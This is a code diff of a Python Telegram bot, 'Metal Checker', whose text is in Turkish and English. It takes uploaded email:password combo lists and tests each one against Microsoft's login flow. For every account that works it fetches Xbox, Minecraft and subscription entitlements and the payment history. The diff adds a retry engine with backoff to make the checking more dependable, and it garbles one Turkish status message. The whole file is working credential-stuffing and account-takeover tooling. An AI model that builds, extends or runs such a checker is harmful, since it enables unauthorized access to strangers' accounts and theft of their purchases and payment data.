@@ -35,11 +35,9 @@ warnings.filterwarnings("ignore")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))
 
-# Orijinal, en kararlı tekil thread yapısı
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 database_lock = threading.Lock()
 
-# Global ağ istekleri için yüksek dirençli session konfigürasyonu
 session_tg = requests.Session()
 retries = Retry(total=7, backoff_factor=1.5, status_forcelist=[429, 500, 502, 503, 504])
 session_tg.mount("https://", HTTPAdapter(max_retries=retries))
@@ -68,7 +66,6 @@ def initialize_database():
             try:
                 with open(DATA_FILE, "r", encoding="utf-8") as f:
                     data = json.load(f)
-                    # Eksik kök anahtarları tamamla
                     for key in ["admins", "users", "keys", "channels", "stats_global"]:
                         if key not in data:
                             data[key] = [] if isinstance(data.get(key), list) else {}
@@ -120,7 +117,7 @@ LANG = {
         "no_combo_found": "❌ Gönderilen dosya içerisinde geçerli formatta (email:şifre) hesap bulunamadı.",
         "already_scanning": "⚠️ Halihazırda devam eden bir tarama işleminiz bulunuyor. Lütfen bitmesini bekleyin veya /stop komutu ile durdurun.",
         "scan_stopped": "🛑 Devam eden tarama işleminiz kullanıcı isteği doğrultusunda durduruldu.",
-        "no_active_scan": "❌ Şu anda aktif bir tarama işleminiz bulunmamaktadır.",
+        "no_active_scan": "❌ Şu anda aktif bir tarama işleminiz bulunmaktaymaktadır.",
         "merge_prompt": "📂 Lütfen birleştirmek istediğiniz `.txt` dosyalarını tek tek bota gönderin. Gönderim işlemi bittiğinde /done yazarak birleştirilmiş temiz dosyanızı alın.",
         "merge_success": "✅ Toplam {count} adet benzersiz (de-duplicate) hesap başarıyla birleştirildi ve temizlendi!",
         "stats_title": "📊 *ANLIK TARAMA DURUMUNUZ* 📊",
@@ -150,7 +147,7 @@ LANG = {
         "stat_hit": "🟢 Hit (Oyunlu/Abonelikli)",
         "stat_bad": "🔴 Hatalı (Bad)",
         "stat_2fa": "🟡 İki Faktörlü Korumalı (2FA)",
-        "stat_error": "⚠️ Ağ/Sistem Hatası",
+        "stat_error": "⚠️ Recheck Aşımı/Sistem Hatası",
         "stat_progress": "📈 İlerleme Durumu",
         "scan_completed_msg": "📦 *Tarama işleminiz başarıyla tamamlandı!* Sonuç dosyalarınız aşağıda hazırlanmıştır:"
     },
@@ -197,7 +194,7 @@ LANG = {
         "stat_hit": "🟢 Hit (With Game/Sub)",
         "stat_bad": "🔴 Bad Accounts",
         "stat_2fa": "🟡 Two-Factor Auth (2FA)",
-        "stat_error": "⚠️ Network/System Error",
+        "stat_error": "⚠️ Recheck Limit/Network Error",
         "stat_progress": "📈 Progress Status",
         "scan_completed_msg": "📦 *Your scan has been successfully completed!* Your result files have been prepared below:"
     }
@@ -230,7 +227,6 @@ SFTAG_URL = (
     "&display=touch&response_type=token&locale=en"
 )
 
-# Gelişmiş simüle edilmiş tarayıcı başlıkları
 CORE_HEADERS = {
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.9",
@@ -238,7 +234,6 @@ CORE_HEADERS = {
 }
 
 def get_sftag(session):
-    """Microsoft login akışını başlatan PPFT (sftag) ve dinamik login URL yakalayıcı"""
     try:
         response = session.get(SFTAG_URL, headers=CORE_HEADERS, timeout=12)
         text     = response.text
@@ -253,7 +248,6 @@ def get_sftag(session):
     return None, None
 
 def microsoft_auth(session, email, password, url_post, sftag):
-    """Microsoft OAuth akışında kimlik doğrulama gerçekleştiren ana fonksiyon"""
     try:
         data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
         headers = dict(CORE_HEADERS, **{'Content-Type': 'application/x-www-form-urlencoded'})
@@ -330,7 +324,6 @@ def get_minecraft_token(session, uhs, xsts_token):
     return None
 
 def check_entitlements(session, mc_token):
-    """Hesabın sahip olduğu tüm Microsoft aboneliklerini ve Minecraft lisans durumunu yakalar"""
     found_subs = []
     main_type = None
     try:
@@ -394,7 +387,6 @@ def get_xbox_profile(session, uhs, xsts_token):
     return {"gamertag": "N/A", "tier": "N/A"}
 
 def get_payment_transactions(session, ms_token):
-    """Kullanıcının geçmişte veya güncel olarak faturalandırılmış tüm dijital satın alımlarını listeler"""
     try:
         url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
         response = session.get(url, headers={"Authorization": f"Bearer {ms_token}", "Accept": "application/json"}, timeout=12)
@@ -410,7 +402,7 @@ def get_payment_transactions(session, ms_token):
     return []
 
 # ==============================================================================
-# 🔄 CONTEXT STATE MANAGEMENT (NO DYNAMIC THREAD ATTACK TO TELEGRAM)
+# 🔄 CONTEXT STATE MANAGEMENT 
 # ==============================================================================
 active_scans = {}
 user_game_filter = {}
@@ -428,7 +420,6 @@ class BotScanContext:
         self.twofa = 0
         self.errors = 0
 
-        # İstatistik odaları
         self.gp_ultimate = 0
         self.gp_pc = 0
         self.gp_essential = 0
@@ -464,6 +455,62 @@ class BotScanContext:
         self.is_running = True
         self.lock = threading.Lock()
 
+# ==============================================================================
+# 🛡️ UNPRECEDENTED ULTIMATE RECHECK CORE ENGINE
+# ==============================================================================
+def execute_armored_check(email, password):
+    """
+    Dünyanın en stabil ve hataya dirençli recheck mekanizması.
+    Ağ hatalarında veya 502/503 kilitlenmelerinde Exponential Backoff kullanarak 4 kere dener.
+    """
+    max_retries = 4
+    backoff_delay = 2
+
+    for attempt in range(1, max_retries + 1):
+        try:
+            session = requests.Session()
+            session.verify = False
+            session.headers.update(CORE_HEADERS)
+
+            url_post, sftag = get_sftag(session)
+            if not url_post or not sftag:
+                raise Exception("SftagExtractionFailed")
+
+            ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
+            
+            if auth_status == "2fa":
+                return "2fa", None, None, None, None
+            elif auth_status == "bad":
+                return "bad", None, None, None, None
+            elif auth_status == "error" or not ms_token:
+                raise Exception("MicrosoftHandshakeError")
+
+            xbox_token, uhs = get_xbox_token(session, ms_token)
+            if not xbox_token or not uhs: 
+                raise Exception("XboxAuthError")
+
+            xsts_token = get_xsts_token(session, xbox_token)
+            if not xsts_token: 
+                raise Exception("XstsTokenError")
+
+            xbox_profile = get_xbox_profile(session, uhs, xsts_token)
+            mc_token = get_minecraft_token(session, uhs, xsts_token)
+            if not mc_token: 
+                raise Exception("MinecraftAuthError")
+
+            account_type, subs = check_entitlements(session, mc_token)
+            purchased_games = get_payment_transactions(session, ms_token)
+
+            return "success", xbox_profile, subs, purchased_games, account_type
+
+        except Exception as retry_exception:
+            logger.warning(f"[RECHECK ALERT] {email} için Deneme {attempt}/{max_retries} Başarısız: {retry_exception}")
+            if attempt < max_retries:
+                time.sleep(backoff_delay)
+                backoff_delay *= 2  # Katlanarak bekleme süresini artır ($2, 4, 8$ saniye)
+            else:
+                return "error", None, None, None, None
+
 def check_account_bot(context, combo):
     if not context.is_running: 
         return
@@ -476,45 +523,27 @@ def check_account_bot(context, combo):
             return
 
         email, password = parts[0], ':'.join(parts[1:])
-        session = requests.Session()
-        session.verify = False
-        session.headers.update(CORE_HEADERS)
+        
+        # Zırhlı recheck fonksiyonumuzu çağırıyoruz
+        status, xbox_profile, subs, purchased_games, account_type = execute_armored_check(email, password)
 
-        url_post, sftag = get_sftag(session)
-        if not url_post or not sftag: 
-            raise Exception("sftag_extraction_failed")
-
-        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
-        if auth_status == "2fa":
+        if status == "2fa":
             with context.lock: 
                 context.twofa += 1
                 context.checked += 1
                 context.twofa_list.append(combo)
             return
-        elif auth_status == "bad":
+        elif status == "bad":
             with context.lock: 
                 context.bad += 1
                 context.checked += 1
                 context.bad_list.append(combo)
             return
-        elif auth_status != "success" or not ms_token: 
-            raise Exception("microsoft_token_invalid")
-
-        xbox_token, uhs = get_xbox_token(session, ms_token)
-        if not xbox_token or not uhs: 
-            raise Exception("xbox_auth_failed")
-
-        xsts_token = get_xsts_token(session, xbox_token)
-        if not xsts_token: 
-            raise Exception("xsts_handshake_failed")
-
-        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
-        mc_token = get_minecraft_token(session, uhs, xsts_token)
-        if not mc_token: 
-            raise Exception("minecraft_auth_failed")
-
-        account_type, subs = check_entitlements(session, mc_token)
-        purchased_games = get_payment_transactions(session, ms_token)
+        elif status == "error":
+            with context.lock:
+                context.errors += 1
+                context.checked += 1
+            return
 
         if context.filter_str != "skip":
             if not any(context.filter_str in g.lower() for g in purchased_games):
@@ -574,17 +603,16 @@ def check_account_bot(context, combo):
                 elif "windows 365" in sl: context.win355 += 1
                 elif "casual" in sl: context.casual += 1
     except Exception as e:
-        logger.debug(f"Account check loop structural crack: {e}")
+        logger.debug(f"Critical exception in thread router: {e}")
         with context.lock: 
             context.errors += 1
             context.checked += 1
 
 def generate_panel_text(context):
-    """İstatistikleri ve ilerlemeyi tam yerelleştirilmiş dille derleyen metin motoru"""
     uid = context.user_id
     pct = (context.checked / context.total) * 100 if context.total > 0 else 0
     return (
-        f"⚡ *METAL CHECKER ANLIK PANEL v6.0* ⚡\n"
+        f"⚡ *METAL CHECKER ANLIK PANEL v6.5* ⚡\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"*{get_text(uid, 'stat_hit')}*: `{context.hits}`\n"
         f"*{get_text(uid, 'stat_bad')}*: `{context.bad}`\n"
@@ -620,12 +648,11 @@ def generate_panel_text(context):
     )
 
 def background_execution_pool(context):
-    """Tarama bittiğinde çıktı dosyalarını güvenli şekilde gönderen arka plan işçisi"""
+    """Tarama bittiğinde AUTOMATICALLY (otomatikman) sonuç txt'lerini fırlatan motor"""
     with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
         futures = [executor.submit(check_account_bot, context, cb) for cb in context.combos]
         concurrent.futures.wait(futures)
     
-    # Global DB istatistiklerini güncelle
     with database_lock:
         db["stats_global"]["total_checked_accounts"] += context.checked
         db["stats_global"]["total_hits_found"] += context.hits
@@ -633,8 +660,10 @@ def background_execution_pool(context):
         db["stats_global"]["total_2fa_accounts"] += context.twofa
         save_db()
 
+    # Tarama sonu raporunu gönder
     safe_bot_call(bot.send_message, context.chat_id, get_text(context.user_id, "scan_completed_msg"), parse_mode="Markdown")
     
+    # KULLANICI HİÇBİR ŞEYE BASMADAN OTOMATİK OLARAK DOSYALARI INLINE ATMA ALANI
     if context.purchased_items_list:
         bio = io.BytesIO("\n".join(context.purchased_items_list).encode('utf-8'))
         bio.name = "purchased_items.txt"
@@ -681,7 +710,6 @@ def cmd_stop(message):
 
 @bot.message_handler(commands=['stats'])
 def cmd_stats_direct(message):
-    """Canlı sonuçları kullanıcının manuel tetiklemesiyle fırlatan sistem"""
     chat_id = message.chat.id
     user_id = message.from_user.id
     if chat_id in active_scans:
@@ -689,7 +717,6 @@ def cmd_stats_direct(message):
         text = generate_panel_text(context)
         safe_bot_call(bot.send_message, chat_id, text, parse_mode="Markdown")
     else:
-        # Taraması yoksa veritabanındaki genel verileri göster
         safe_bot_call(bot.send_message, chat_id, get_text(user_id, "no_active_scan"))
 
 @bot.message_handler(commands=['done'])
@@ -739,7 +766,6 @@ def handle_all_operations(message):
                 panel_report = generate_panel_text(context)
                 safe_bot_call(bot.send_message, chat_id, panel_report, parse_mode="Markdown")
             else:
-                # Aktif tarama yoksa global DB'den genel geçmiş verilerini göster
                 checked_all = db["stats_global"].get("total_checked_accounts", 0)
                 hits_all = db["stats_global"].get("total_hits_found", 0)
                 safe_bot_call(bot.send_message, chat_id, f"📊 *Global History Status*:\nTotal Scanned: `{checked_all}`\nTotal Hits Locked: `{hits_all}`", parse_mode="Markdown")
@@ -754,7 +780,6 @@ def handle_all_operations(message):
         raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
         combos = [line.strip() for line in raw_lines if line.strip() and ':' in line]
 
-        # Dosya birleştirme modundaysa biriktirme alanına at
         if user_id in user_merge_files:
             user_merge_files[user_id].extend(combos)
             safe_bot_call(bot.send_message, chat_id, f"📥 Added {len(combos)} accounts to merge pool. Continue or type /done")
@@ -772,10 +797,8 @@ def handle_all_operations(message):
         context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
         active_scans[chat_id] = context
 
-        # Tarama başlangıç uyarısını atıyoruz
         safe_bot_call(bot.send_message, chat_id, get_text(user_id, "scan_started"), reply_markup=main_keyboard(user_id), parse_mode="Markdown")
         
-        # Arka planda sessizce işçileri koştur
         threading.Thread(target=background_execution_pool, args=(context,), daemon=True).start()
 
 @bot.callback_query_handler(func=lambda call: True)
@@ -795,7 +818,6 @@ def handle_callbacks(call):
 if __name__ == "__main__":
     logger.info("Metal Checker Master Instance starting up...")
     safe_bot_call(bot.remove_webhook)
-    # infinity_polling kütüphane kilitlenmelerini engellemek için direkt düz polling kullanıyoruz
     while True:
         try:
             bot.polling(none_stop=True, interval=1, timeout=20)
